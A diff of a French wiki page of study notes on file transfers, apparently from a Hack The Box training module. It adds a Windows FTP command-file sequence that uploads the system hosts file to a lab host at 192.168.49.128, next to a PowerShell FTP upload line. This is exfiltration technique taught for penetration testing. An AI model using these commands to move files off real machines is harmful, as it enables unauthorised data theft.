@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:29:37.030Z
+date: 2025-03-29T13:30:33.807Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -318,5 +318,16 @@ Pour envoyer un fichier vers le serveur FTP:
 
 ```
 (New-Object Net.WebClient).UploadFile('ftp://<adresse>/<fichier>', '<fichier>')
+```
+
+Il est aussi possible de créer un fichier de commande FTP comme vu précédemment:
+
+```
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
 ```
 
